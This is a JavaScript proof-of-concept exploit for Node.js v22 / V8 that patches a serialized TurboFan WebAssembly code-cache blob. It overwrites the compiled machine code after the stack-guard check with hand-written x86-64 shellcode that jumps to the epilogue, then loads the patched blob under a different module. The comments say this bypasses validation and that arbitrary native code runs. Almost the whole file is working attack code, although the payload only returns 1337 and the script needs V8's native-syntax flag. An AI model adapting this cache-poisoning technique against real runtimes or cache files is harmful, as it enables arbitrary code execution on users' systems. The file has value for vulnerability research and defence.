// V8 Wasm Cache — Arbitrary Shellcode Injection PoC
// Node.js v22.23.5 / V8 12.4.254.21-node.57
//
// Extends poc_injection.js: instead of injecting wasm-compiled code,
// we patch the TurboFan blob's code_data with hand-written x86-64 shellcode.
// The trailing 4 bytes are tiering budget (NOT a hash), so patching
// code_data bypasses all validation — confirmed by SIGSEGV in prior run.
//
// Goal: g() returns 1337 (arbitrary integer from hand-written asm)
//
// Run: node --allow-natives-syntax --no-wasm-lazy-compilation shellcode_poc.js

'use strict';

const POISONER = new Uint8Array([
  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
  0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
  0x03,0x02,0x01,0x00,
  0x07,0x05,0x01,0x01,0x66,0x00,0x00,
  0x0a,0x19,0x01,0x17,
    0x01,0x01,0x7f,
    0x03,0x40,
      0x20,0x00,0x41,0x01,0x6a,0x21,0x00,
      0x20,0x00,0x41,0x32,0x48,0x0d,0x00,
    0x0b,
    0x20,0x00,0x0b,
]);

const VICTIM = new Uint8Array([
  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
  0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
  0x03,0x02,0x01,0x00,
  0x07,0x05,0x01,0x01,0x67,0x00,0x00,
  0x0a,0x19,0x01,0x17,
    0x01,0x01,0x7f,
    0x03,0x40,
      0x20,0x00,0x41,0x01,0x6a,0x21,0x00,
      0x20,0x00,0x41,0x2a,0x48,0x0d,0x00,
    0x0b,
    0x20,0x00,0x0b,
]);

// ── Step 1: Warm POISONER to TurboFan ─────────────────────────────────────────
process.stdout.write('[1] Compiling POISONER to TurboFan... ');
const mPoisoner = new WebAssembly.Module(POISONER);
const iPoisoner = new WebAssembly.Instance(mPoisoner);
let w = 0; for (let i = 0; i < 100000; i++) w += iPoisoner.exports.f();
console.log('f()=' + iPoisoner.exports.f());

// ── Step 2: Serialize and inspect blob ────────────────────────────────────────
const blob = %SerializeWasmModule(mPoisoner);
if (!blob) { console.error('[!] Serialization failed'); process.exit(1); }
const bv = new Uint8Array(blob);
if (bv[29] !== 0x04) { console.error('[!] Not TurboFan'); process.exit(1); }

// code_data starts at byte 83 (global_hdr=20 + tcs=8 + fully_validated=1 +
// code_kind=1 + 6×int32=24 + tagged_param_slots=4 + code_size=4 + reloc=4 +
// src_pos=4 + inlining=4 + protected=4 + kind=4 + tier=1 = 83)
const CODE_DATA_OFF = 83;
const codeSize = new DataView(blob).getUint32(58, true);  // bytes 58-61
console.log('[2] Blob: ' + blob.byteLength + 'B  code_size=' + codeSize);

const cd = bv.slice(CODE_DATA_OFF, CODE_DATA_OFF + codeSize);

// Dump code_data hex for reference
console.log('[3] code_data hex dump:');
for (let i = 0; i < cd.length; i += 16) {
  const chunk = Array.from(cd.slice(i, i+16)).map(b => b.toString(16).padStart(2,'0')).join(' ');
  console.log('  ' + String(i).padStart(3) + ': ' + chunk);
}

// ── Step 3: Locate key sequences ─────────────────────────────────────────────
// Stack guard check: 49 3b 65 a0  (cmp rsp,[r13-96])
//                   0f 86 XX XX XX XX  (jbe overflow_handler)
// Total: 10 bytes.  Patch point is AFTER this (i+10).
let guardOff = -1;
for (let i = 0; i < cd.length - 10; i++) {
  if (cd[i] === 0x49 && cd[i+1] === 0x3b && cd[i+2] === 0x65 && cd[i+3] === 0xa0 &&
      cd[i+4] === 0x0f && cd[i+5] === 0x86) {
    guardOff = i;
    break;
  }
}
if (guardOff < 0) { console.error('[!] Guard check not found'); process.exit(1); }
console.log('[4] Stack guard at cd[' + guardOff + ']  patch point: cd[' + (guardOff+10) + ']');

console.log('[5] guard check at cd[' + guardOff + '], 10B: ' +
  Array.from(cd.slice(guardOff, guardOff+10)).map(b=>b.toString(16).padStart(2,'0')).join(' '));

// ── Step 4: Find epilogue offset ──────────────────────────────────────────────
// Epilogue: 48 8b e5 5d c3 (mov rsp,rbp; pop rbp; ret)
// All loop exit paths jump here with the return value already in eax.
// We patch:  b8 39 05 00 00  → mov eax, 0x539 (1337)
//            e9 XX XX XX XX  → jmp to epilogue
// Using eax (b8), NOT ebx (bb), because V8 wasm i32 returns via eax.

let epilogueOff = -1;
for (let i = 0; i < cd.length - 5; i++) {
  if (cd[i]   === 0x48 && cd[i+1] === 0x8b && cd[i+2] === 0xe5 &&
      cd[i+3] === 0x5d && cd[i+4] === 0xc3) {
    epilogueOff = i;
  }
}
if (epilogueOff < 0) { console.error('[!] epilogue not found'); process.exit(1); }
console.log('[6] epilogue (mov rsp,rbp; pop rbp; ret) at cd[' + epilogueOff + ']');

// patchOff = after guard check (10B); jmp is at patchOff+5 (5B after mov eax,1337)
const patchOff = guardOff + 10;
// next_pc after jmp = patchOff + 5 (mov) + 5 (jmp) = patchOff + 10
const relJmp = epilogueOff - (patchOff + 10);  // signed int32

console.log('[7] patchOff=' + patchOff + '  epilogueOff=' + epilogueOff + '  relJmp=' + relJmp);
console.log('    orig cd[patchOff..+8]: ' +
  Array.from(cd.slice(patchOff, patchOff+8)).map(b=>b.toString(16).padStart(2,'0')).join(' '));

if (relJmp < -0x80000000 || relJmp > 0x7fffffff) {
  console.error('[!] relJmp out of int32 range:', relJmp); process.exit(1);
}

const patched = blob.slice(0);
const pv = new Uint8Array(patched);
const dv = new DataView(patched);

// mov eax, 1337  (b8 = eax variant; 1337 = 0x00000539)
pv[CODE_DATA_OFF + patchOff + 0] = 0xb8;
pv[CODE_DATA_OFF + patchOff + 1] = 0x39;  // 1337 = 0x0539
pv[CODE_DATA_OFF + patchOff + 2] = 0x05;
pv[CODE_DATA_OFF + patchOff + 3] = 0x00;
pv[CODE_DATA_OFF + patchOff + 4] = 0x00;
// jmp rel32
pv[CODE_DATA_OFF + patchOff + 5] = 0xe9;
dv.setInt32(CODE_DATA_OFF + patchOff + 6, relJmp, true);

console.log('    patched cd[patchOff..+10]: ' +
  Array.from(pv.slice(CODE_DATA_OFF+patchOff, CODE_DATA_OFF+patchOff+10))
       .map(b=>b.toString(16).padStart(2,'0')).join(' '));

// ── Step 5: Inject ────────────────────────────────────────────────────────────
console.log('[7] Injecting patched shellcode (expect g()=1337)...');
const mPoisoned = %DeserializeWasmModule(patched, VICTIM);
if (!mPoisoned) { console.error('[!] Deserialization returned null'); process.exit(1); }

const result = new WebAssembly.Instance(mPoisoned).exports.g();
console.log('');
console.log('g() returned: ' + result);

if (result === 1337) {
  console.log('');
  console.log('╔════════════════════════════════════════════════════════╗');
  console.log('║  ARBITRARY SHELLCODE CONFIRMED: g() = 1337            ║');
  console.log('║  Hand-written x86-64 asm executed in VICTIM slot      ║');
  console.log('║  No wasm compilation, no hash validation               ║');
  console.log('╚════════════════════════════════════════════════════════╝');
  process.exit(0);
} else {
  console.log('[?] Got ' + result + ' instead of 1337 — check offsets above');
  process.exit(1);
}
